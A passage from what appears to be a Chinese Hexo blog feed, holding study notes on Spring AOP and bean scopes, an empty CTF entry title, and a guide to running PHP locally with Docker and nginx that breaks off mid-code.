check()等，最终还是通过proxy模式(但是是由框架具体实现，<strong>加了一层抽象</strong>)来调用对于的切面功能，其实也是<strong>将切面与代理解耦了</strong></li><li>spring中aop实质是代理模式，将公共功能代码提取到切面中，通过代理对象将切面逻辑横插入业务逻辑调用链的连接点，前或后或环绕；</li><li>aop是方法执行前进行拦截，做些其他处理，让service只关注自身业务，使用代理只是实现aop的一种方式，使用aop不需要对原来service做任何修改，<strong>是无感知的</strong></li></ol></li><li>在AOP的实现上，我们需要实现<ol><li>目标类的核心功能，比如图书管理员的BookService</li><li>切面逻辑：权限检查&#x2F;日志&#x2F;信息检查</li></ol></li></ol></li></ol></li><li><p><em><strong>AOP的原理</strong></em>：AOP思想的实现依赖于框架的抽象，在Java平台上，对于AOP的织入，有3种方式</p><ol><li><p>字节码层面(就不是代理了)</p><ol><li>编译期：在编译时，由编译器把切面调用编译进字节码，这种方式需要定义新的关键字并扩展编译器，AspectJ就扩展了Java编译器，使用关键字aspect来实现织入</li><li>类加载器：在目标类被装载到JVM时，通过一个特殊的类加载器，对目标类的字节码重新“增强”</li></ol></li><li><p>代码层面(代理)</p><ol><li>运行期：目标对象和切面都是普通Java类，通过JVM的动态代理功能或者第三方库实现运行期动态织入</li></ol></li><li><p><strong>在Spring中</strong>: Spring的AOP实现就是基于JVM的动态代理。由于JVM的动态代理要求必须实现接口，如果一个普通类没有业务接口，就需要通过CGLIB或者Javassist这些第三方库实现</p><blockquote><p>未考证：Spring AOP实现AOP的方式是动态代理，而AspectJ实现的方式是静态代理。Spring虽然支持AspectJ，但仅仅是支持AspectJ的切点解析和匹配，比如@Before注解和execution()语句，代理的底层实现还是Spring AOP，即JDK动态代理和CGLIB动态代理</p></blockquote></li></ol></li><li><p><em><strong>AOP的应用</strong></em></p><ol><li>横跨类&#x2F;类方法的通用问题很适合</li><li>个异问题就不太合适，但是也可以通过注解来配置AOP的工作范围&#x2F;函数</li></ol></li></ol><h3 id="利用Spring应用AOP"><a href="#利用Spring应用AOP" class="headerlink" title="利用Spring应用AOP"></a>利用Spring应用AOP</h3><ol><li>我们以一个例子来理解过程，现在有两个核心业务：UserService, MailService<ol><li><p>现在的要求</p><ol><li>给UserService的每个业务方法执行前添加日志</li><li>给MailService的每个业务方法执行前后添加日志</li></ol></li><li><p><strong>实现流程</strong></p><ol><li>S1: 引入依赖<code>org.springframework:spring-aspects:6.0.0</code>，自动引入了AspectJ，使用AspectJ实现AOP比较方便，因为它的定义比较简单</li><li>S2: 定义一个切面<ol><li>并在方法上通过AspectJ的注解告诉Spring应该在何处调用此方法</li><li>配置支持通配，但是<strong>最佳实践是尽量具体</strong>，防止无意调用对开闭产生了影响</li><li>标记<code>@Component</code>和<code>@Aspect</code></li></ol></li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoggingAspect</span> &#123;</span><br><span class="line">    <span class="comment">// 在执行UserService的每个方法前执行:</span></span><br><span class="line">    <span class="meta">@Before(&quot;execution(public * com.itranswarp.learnjava.service.UserService.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doAccessCheck</span><span class="params">()</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;[Before] do access check...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在执行MailService的每个方法前后执行:</span></span><br><span class="line">    <span class="meta">@Around(&quot;execution(public * com.itranswarp.learnjava.service.MailService.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">doLogging</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;[Around] start &quot;</span> + pjp.getSignature());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">retVal</span> <span class="operator">=</span> pjp.proceed();</span><br><span class="line">        System.err.println(<span class="string">&quot;[Around] done &quot;</span> + pjp.getSignature());</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>S3: 给@Configuration类加上一个@EnableAspectJAutoProxy注解，有它来控制</p><ol><li>Spring的IoC容器看到这个注解，就会自动查找带有@Aspect的Bean，然后根据每个方法的@Before、@Around等注解把AOP注入到特定的Bean中</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="meta">@EnableAspectJAutoProxy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接下来就大功搞成了，直接调用就ok了</p></li></ol></li><li><em><strong>最佳实践</strong></em><ol><li>通过注解来识别并进行AOP，类似于<code>@Around(&quot;@annotation(metricTime)&quot;)</code></li></ol></li></ol><h3 id="Spring背后的AOP装配"><a href="#Spring背后的AOP装配" class="headerlink" title="Spring背后的AOP装配"></a>Spring背后的AOP装配</h3><ol><li><p>Spring容器启动时为我们<strong>自动创建的注入了Aspect的子类</strong>，它取代了原始的UserService(原始的UserService实例作为内部变量(<strong>组合</strong>)隐藏在UserServiceAopProxy中)如果我们打印从Spring容器获取的UserService实例类型，它类似UserService$$EnhancerBySpringCGLIB$$1f44e01c，实际上是Spring使用CGLIB动态创建的子类，但对于调用方来说，感觉不到任何区别(<strong>无感&#x2F;被拦截</strong>)</p><ol><li>使用AspectJ解析注解，并通过CGLIB实现代理类</li><li>Spring也提供其他方法来装配AOP，但都没有使用AspectJ注解的方式来得简洁明了</li></ol><blockquote><p>Spring对接口类型使用JDK动态代理，对普通类使用CGLIB创建子类。如果一个Bean的class是final，Spring将无法为其创建子类</p></blockquote><ol><li><p>一个类似的实现(仅仅是类似)</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> UserServiceAopProxy <span class="keyword">extends</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserService target;</span><br><span class="line">    <span class="keyword">private</span> LoggingAspect aspect;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserServiceAopProxy</span><span class="params">(UserService target, LoggingAspect aspect)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">        <span class="built_in">this</span>.aspect = aspect;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">login</span><span class="params">(String email, String password)</span> &#123;</span><br><span class="line">        <span class="comment">// 先执行Aspect的代码:</span></span><br><span class="line">        aspect.doAccessCheck();</span><br><span class="line">        <span class="comment">// 再执行UserService的逻辑:</span></span><br><span class="line">        <span class="keyword">return</span> target.login(email, password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">register</span><span class="params">(String email, String password, String name)</span> &#123;</span><br><span class="line">        aspect.doAccessCheck();</span><br><span class="line">        <span class="keyword">return</span> target.register(email, password, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>拦截器：代理拦截方法，有以下类型</p><ol><li>@Before：这种拦截器先执行拦截代码，再执行目标代码。如果拦截器抛异常，那么目标代码就不执行了；</li><li>@After：这种拦截器先执行目标代码，再执行拦截器代码。无论目标代码是否抛异常，拦截器代码都会执行；</li><li>@AfterReturning：和@After不同的是，只有当目标代码正常返回时，才执行拦截器代码；</li><li>@AfterThrowing：和@After不同的是，只有当目标代码抛出了异常时，才执行拦截器代码；</li><li>@Around：能完全控制目标代码是否执行，并可以在执行前后、抛异常后执行任意拦截代码，可以说是包含了上面所有功能。</li></ol></li></ol><h3 id="Spring-AOP避坑"><a href="#Spring-AOP避坑" class="headerlink" title="Spring AOP避坑"></a>Spring AOP避坑</h3><ol><li>因为Spring使用了CGLIB来实现运行期动态创建Proxy，如果我们没能深入理解其运行原理和实现机制，就极有可能遇到各种诡异的问题<ol><li><p><em><strong>Q1: 访问原有变量(almost确定)会返回none?</strong></em></p><ol><li>S1: 只需要把直接访问字段的代码，改为通过方法访问</li><li><strong>讲讲原因</strong><ol><li>Spring通过CGLIB动态创建的UserService$$EnhancerBySpringCGLIB代理类，它的构造方法中，并未调用super()，因此，从父类继承的成员变量，包括final类型的成员变量，统统都没有初始化</li><li>Java语言规定，任何类的构造方法，第一行必须调用super()，如果没有，编译器会自动加上，怎么Spring的CGLIB就可以搞特殊？这是因为自动加super()的功能是Java编译器实现的，它发现你没加，就自动给加上，发现你加错了，就报编译错误。但实际上，如果直接构造字节码，一个类的构造方法中，不一定非要调用super()。Spring使用CGLIB构造的Proxy类，是直接生成字节码，<strong>并没有源码-编译-字节码这个步骤</strong></li><li><strong>总结</strong>: Spring通过CGLIB创建的代理类，不会初始化代理类自身继承的任何成员变量，包括final类型的成员变量！</li></ol></li></ol><blockquote><ol><li>来自教程评论区的一个评论；看了下cglib的源码，生成的代理类的构造方法里面是会去调用super()方法的了，现在的版本好像不存在这个问题。即便不是String类型的，也可以访问得到</li><li>来自老师和其他人debug的解释：spring会先创建目标对象，再把目标对象注入到代理对象中，虽然代理对象继承了目标对象，但他们之间的关系本质还是组合。</li></ol></blockquote></li><li><p><em><strong>Q2: 为什么Spring刻意不初始化Proxy继承的字段？</strong></em></p><ol><li>A1: 老师的说法是spring无法在逻辑上正常初始化proxy的字段(有些是对象这样)，所以干脆不初始化，并通过NullPointerException直接暴露出来</li><li>A2: 另外补充的说法，感觉有道理，OOP的思想：proxy类只承诺了要代理目标类的public方法，所以理论上一切的交互都应该被限制在被代理的方法集合里，<strong>不应该越过proxy的接口而直接交互</strong>。如果有新增的交互需求，都应该被统一到这个“被代理的方法集合”里去。</li></ol></li><li><p><em><strong>Q3: 如果一个Bean不允许任何AOP代理，应该怎么做来“保护”自己在运行期不会被代理？</strong></em></p><ol><li>类设置为 final 的防止 cglib 创建Proxy，并且不继承接口防止 JDK 自带的动态代理</li></ol></li></ol></li></ol><h2 id="扫疑环节"><a href="#扫疑环节" class="headerlink" title="扫疑环节"></a>扫疑环节</h2><blockquote><p>对重要的概念进行复习</p></blockquote><h3 id="Spring-Bean"><a href="#Spring-Bean" class="headerlink" title="Spring Bean"></a>Spring Bean</h3><h4 id="Bean比较"><a href="#Bean比较" class="headerlink" title="Bean比较"></a>Bean比较</h4><ol><li>不同于java bean<ol><li>JavaBean是一种遵循特定编码规范的Java类，它具有私有属性、公共无参构造函数以及公共的getter和setter方法。此外，JavaBean通常是可序列化的，即实现了Serializable接口。</li><li>SpringBean是指由Spring容器管理的对象。这些对象可以是任何Java类的实例，例如数据库连接、业务逻辑类或控制器等。Spring容器负责创建和销毁这些Bean，并且通过依赖注入（Dependency Injection, DI）机制来配置它们之间的关系。这意味着应用程序不需要直接创建和管理这些对象，而是将这个责任委托给了Spring容器</li></ol></li><li><strong>用途上</strong>：传统意义上的JavaBean主要用于表示数据，作为值对象传递参数，而Spring Bean几乎可以涵盖应用中的所有组件，从简单的POJO到复杂的业务服务层对象</li><li><strong>生命周期上</strong>：JavaBean的生命周期完全由应用程序控制，通常使用new关键字实例化后即可使用，当不再需要时由JVM的垃圾回收机制处理。然而，Spring Bean的生命周期则由Spring容器负责，包括初始化前后的回调、销毁时的动作等，这使得Spring Bean拥有更复杂的生命周期管理</li></ol><h4 id="Component总结"><a href="#Component总结" class="headerlink" title="Component总结"></a>Component总结</h4><ol><li>什么是组件？<ol><li>组件（Component） 是指由Spring容器管理的类，<strong>这些类通常表示应用程序中的一个具体职责或功能模块</strong>。组件通过特定的注解被标记出来，使得Spring容器能够自动发现、实例化并管理它们的生命周期。组件可以是任何类型的Java对象，但最常见的是服务层、数据访问层和控制器层的对象</li></ol></li><li><strong>组件的种类</strong><ol><li>@Component：通用注解，适用于任何需要被Spring容器管理的类。</li><li>@Service：用于标注业务逻辑层的服务类。</li><li>@Repository：用于标注数据访问层的类，如DAO（Data Access Object）。</li><li>@Controller：用于标注Web层的控制器类，通常与MVC模式一起使用。</li><li>@RestController：结合了@Controller和@ResponseBody的功能，直接返回数据给客户端，常用于构建RESTful Web服务。</li></ol></li><li>SpringBean和Component</li></ol><h4 id="Bean的作用域"><a href="#Bean的作用域" class="headerlink" title="Bean的作用域"></a>Bean的作用域</h4><h5 id="五种类型"><a href="#五种类型" class="headerlink" title="五种类型"></a>五种类型</h5><ol><li>在Spring框架中，Bean 并不局限于只有一个实例。实际上，Spring容器可以管理多个不同类型的Bean，并且对于同一个类也可以创建多个实例，这取决于如何配置它们以及使用何种作用域（Scope）</li><li>常见的几种作用域<ol><li><p>Singleton（单例）：<strong>这是默认的作用域</strong>。在整个应用程序上下文中，Spring只会为每个被定义为singleton的Bean创建一个共享实例。这意味着无论何时何地从Spring容器中获取该Bean，得到的都是同一个对象实例。这种方式适用于无状态的服务组件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bookService 将被注册为一个单例Bean</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> BookService <span class="title function_">bookService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BookServiceImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Prototype（原型）：每次通过Spring容器请求时都会创建一个新的Bean实例，这里的原型和js中的原型不一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每一次返回一个新的实例</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Scope(&quot;prototype&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> BookSession <span class="title function_">bookSession</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BookSession</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Application（应用程序）：在整个Servlet上下文内唯一，类似于singleton，但它的范围限于当前的应用程序上下文。</p></li><li><p>Request（请求）：在一个HTTP请求范围内有效，即每次HTTP请求都会创建新的Bean实例，但在同一个请求内共享同一个实例。主要用于Web应用中处理特定请求的数据。</p></li><li><p>Session（会话）：在一个HTTP会话范围内有效，意味着同一用户的多个请求之间共享同一个Bean实例。适用于需要跨多个请求保存用户状态的情况。</p></li></ol></li><li>可以使用<code>@Scope(&#39;prototype&#39;)</code>这样来修改作用域</li></ol><h5 id="关于singleton和applicaton"><a href="#关于singleton和applicaton" class="headerlink" title="关于singleton和applicaton"></a>关于singleton和applicaton</h5><h4 id="Bean和Component"><a href="#Bean和Component" class="headerlink" title="Bean和Component"></a>Bean和Component</h4><blockquote><p>所有的组件都是Bean</p></blockquote><ol><li>Bean是指由Spring容器管理的对象或实例。它可以是任何Java类的实例，只要这个类被Spring容器所管理</li><li>组件是带有特定注解（如@Component, @Service, @Repository, @Controller等）的类，这些注解使得类能够被Spring容器自动检测并注册为Bean。因此，可以说所有被标记为组件的类本质上都是Bean<ol><li>自动配置：通过组件扫描（Component Scanning），Spring容器会自动查找应用中的组件，并将它们注册为Bean，无需显式地在XML文件或配置类中声明</li></ol></li><li>**默认单例模式(不使用Component也是)**：使用 @Component 注解（或其衍生注解如 @Service, @Repository, @Controller 等）并将其注册到Spring容器中时，默认情况下Spring会将这个Bean以 Singleton 作用域创建。这意味着在整个应用程序上下文中，Spring只会为该Bean创建一个共享实例，并且无论何时何地从Spring容器中获取该Bean，得到的都是同一个对象实例<ol><li>可以通过在<code>@Componet</code>下追加<code>@Scope(&#39;xxx&#39;)</code>来修改作用域</li></ol></li></ol><h4 id="Bean与注入"><a href="#Bean与注入" class="headerlink" title="Bean与注入"></a>Bean与注入</h4><ol><li>@Bean注解<ol><li>@Bean 注解通常用于配置类的方法上，指示该方法返回的对象应该被注册为Spring容器中的一个Bean。这意味着每次调用这个方法时，Spring都会检查是否已经存在相应的Bean实例；如果存在，则直接返回现有的实例（对于单例作用域），否则将创建并初始化一个新的Bean实例。</li></ol></li><li>@Autowired<ol><li>构造函数注入：官方推荐</li><li>字段注入</li><li>setter注入</li><li>结合使用@Autowired和@Qualifier注解来进行构造器注入，@Qualifier来指定具体的Bean名称</li></ol></li></ol><h3 id="配置类"><a href="#配置类" class="headerlink" title="配置类"></a>配置类</h3><h4 id="配置类而不是XML"><a href="#配置类而不是XML" class="headerlink" title="配置类而不是XML"></a>配置类而不是XML</h4><ol><li>用于在Java代码中定义应用程序的配置。它们替代了传统的XML配置文件</li><li>使用@Configuration注解来标识。这个注解告诉Spring容器，此类包含一个或多个用@Bean注解的方法，这些方法会返回一个对象，而该对象应该被注册为Spring应用上下文中的bean。配置类本身也可以被组件扫描发现并注册到Spring容器中，或者通过@Import注解显式导入。</li></ol><h4 id="配置类常用注解"><a href="#配置类常用注解" class="headerlink" title="配置类常用注解"></a>配置类常用注解</h4><ol><li>@Configuration 注解<ol><li>用来标记一个类作为Spring IoC容器中的bean定义的来源</li><li>配置类内部可以有多个@Bean方法，每个方法定义了一个或多个bean。</li></ol></li><li>@Bean 注解<ol><li>用于标记配置类中的方法，表示该方法返回的对象应被注册为Spring应用上下文中的bean。</li><li>可以指定bean的名称、作用域等属性。</li></ol></li><li><strong>支持条件配置</strong>: 使用如@ConditionalOnProperty、@ConditionalOnClass等条件注解，可以让bean的创建基于某些条件，例如环境变量、类路径上的类存在与否等</li><li><strong>静态与非静态@Bean方法</strong>: @Bean方法既可以是静态的也可以是非静态的。如果是一个静态方法，则不会参与依赖注入，因为没有实例化配置类；而非静态方法则可以。</li></ol><h4 id="代理机制"><a href="#代理机制" class="headerlink" title="代理机制"></a>代理机制</h4><blockquote><p>廖雪峰有比较深入地进行探讨</p></blockquote><ol><li>当配置类之间相互依赖时，Spring会使用CGLIB代理机制来确保即使是在同一个配置类内，不同的@Bean方法也能正确地互相引用</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>[<a href="https://liaoxuefeng.com/books/java/spring/index.html]">https://liaoxuefeng.com/books/java/spring/index.html]</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python栈帧沙箱逃逸</title>
      <link href="/2024/12/07/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/12/07/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建本地linux下的php环境</title>
      <link href="/2024/12/04/%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0linux%E4%B8%8B%E7%9A%84php%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/12/04/%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0linux%E4%B8%8B%E7%9A%84php%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这几天数字逻辑期末考试，3天速通一下回来了；上次到ciscn24的simple_php那里命令执行在windows下phpstudy没法模拟，所以来学一下本地搭建linux的php环境，但是这里没有也问题不大，可以靠脑子模拟一下</p></blockquote><h2 id="内置web-server"><a href="#内置web-server" class="headerlink" title="内置web server"></a>内置web server</h2><ol><li><p>ref[<a href="https://www.php.net/manual/zh/features.commandline.webserver.php]">https://www.php.net/manual/zh/features.commandline.webserver.php]</a></p></li><li><p><strong>一键运行</strong>: 在wsl下&#x2F;vps上运行<code>php -S 127.0.0.1:7777 route.php</code>，随后直接访问<code>ip:7777</code>就可以了，类似如下模板</p><ol><li>routes等有需要再来，ai一下就好了，<strong>比如请求有固定的后缀这些</strong></li><li>这里只是浅做一个日志</li></ol> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// route.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="keyword">__DIR__</span>.<span class="string">&#x27;php.log&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logAccess</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取时间</span></span><br><span class="line">    <span class="variable">$timestamp</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">    <span class="comment">// 获取客户端 IP 地址</span></span><br><span class="line">    <span class="variable">$clientIp</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] ?? <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">    <span class="comment">// 获取请求 URI</span></span><br><span class="line">    <span class="variable">$requestUri</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] ?? <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">    <span class="comment">// 获取 HTTP 方法（GET, POST 等）</span></span><br><span class="line">    <span class="variable">$httpMethod</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] ?? <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">    <span class="comment">// 构建日志条目</span></span><br><span class="line">    <span class="variable">$logEntry</span> = <span class="string">&quot;[<span class="subst">$timestamp</span>] IP: <span class="subst">$clientIp</span>, Method: <span class="subst">$httpMethod</span>, URI: <span class="subst">$requestUri</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将日志条目追加到日志文件</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log</span>, <span class="variable">$logEntry</span>, FILE_APPEND | LOCK_EX);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于测试是否访问到，其实也可以看Server的输出</span></span><br><span class="line"><span class="title function_ invoke__">logAccess</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>???存在一个问题没有解决</strong>：内置server中在vps中外部无法访问</p></li></ol><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><h3 id="php-fpm-nginx"><a href="#php-fpm-nginx" class="headerlink" title="php-fpm + nginx"></a>php-fpm + nginx</h3><blockquote><p>没有xdebug的，配置它有点麻烦，算了，总之可以直接输出<br>直接按着下面步骤就ok，一般肯定可以，解释看菜鸟教程的文档</p></blockquote><ol><li><strong>S1: docker下载镜像</strong>；php找版本，tags里搜；nginx也一样，但是可以直接复用本地有的</li><li><strong>S2: 挂载目录，开启php</strong>；创建目录<code>mkdir -p ~/Docker/nginx/www</code>，然后<code>docker run  --name php7.3-fpm -v ~/Docker/nginx/www:/www -d php:7.3.33-fpm</code></li><li><strong>S3: 配置文件，挂载nginx</strong><ol><li><p>S1: nginx配置文件，路径<code>~/Docker/nginx/conf/conf.d</code>，并<code>vim ~/Docker/nginx/conf/conf.d/nginx-php.conf</code>，写入以下内容</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       <span class="number">80</span>;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm index.php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /<span class="number">50</span>x.html;</span><br><span class="line">    location = /<span class="number">50</span>x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  /www/<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>S2: <code>docker run  --name nginx-php -p 8083:80 -d -v  ~/Docker/nginx/www:/usr/share/nginx/html:ro -v ~/Docker/nginx/conf/conf.d/:/etc/nginx/conf.d:ro --link php7.3-fpm:php nginx</code>，在本地8083端口访问<code>http://localhost:8083/</code></p></li></ol></li><li><strong>S4: 修改目录权限，可以vscode</strong>：<code>sudo chown $USER:$USER ~/Docker/nginx/www</code></li><li><strong>S5: 关闭与重启</strong>；<code>docker start &lt;container-name&gt;</code></li><li><strong>S6: 交互式进入php环境</strong>；<code>docker exec -it &lt;container-name&gt; /bin/bash</code></li></ol><h3 id="lmnp"><a href="#lmnp" class="headerlink" title="lmnp"></a>lmnp</h3><blockquote><p>暂时先跳过，没有这个需求，可以借助这个东西来学docker compose</p></blockquote><h2 id="debug-without-xdebug"><a href="#debug-without-xdebug" class="headerlink" title="debug without xdebug"></a>debug without xdebug</h2><h3 id="最终答案统一模板"><a href="#最终答案统一模板" class="headerlink" title="最终答案统一模板"></a>最终答案统一模板</h3><blockquote><ol><li>php是一个顺序执行的语句，只有在出错时才会停止</li><li>先给出一个统一处理的模板吧，其他可用[<a href="https://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]">https://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]</a></li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. 可能需要到php.ini中手动修改，一般可以</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, 